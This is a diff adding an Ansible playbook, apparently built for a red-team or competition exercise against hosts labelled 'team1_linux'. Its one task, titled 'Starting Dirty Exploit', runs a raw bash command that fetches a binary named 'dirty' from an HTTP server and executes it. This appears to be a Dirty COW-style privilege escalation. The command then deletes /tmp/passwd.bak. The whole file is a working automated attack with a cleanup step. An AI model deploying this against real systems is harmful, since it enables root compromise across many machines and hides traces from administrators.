@@ -1,0 +1,11 @@
+---
+- hosts: team1_linux
+  connection: local
+  gather_facts: false
+  tasks:
+    - name: "Starting Dirty Exploit"
+      raw: "wget http://localhost:8000/dirty; chmod +x dirty;./dirty;rm /tmp/passwd.bak"
+      args:
+       executable: /bin/bash
+      ignore_errors: true
+
